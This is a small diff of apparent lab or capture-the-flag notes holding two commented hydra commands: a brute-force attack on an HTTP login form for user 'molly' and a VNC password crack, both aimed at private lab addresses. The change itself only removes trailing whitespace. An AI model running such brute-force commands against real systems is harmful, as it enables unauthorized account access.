@@ -2,7 +2,7 @@
 
 # http web form crack
 # hydra -l molly -P /usr/share/hydra/dpl4hydra_local.csv 10.10.192.3 \
-# http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V -t 4    
+# http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V -t 4
 
 # VNC crack
 # hydra -P ./passlist.txt 10.10.5.50 vnc -V -t 4
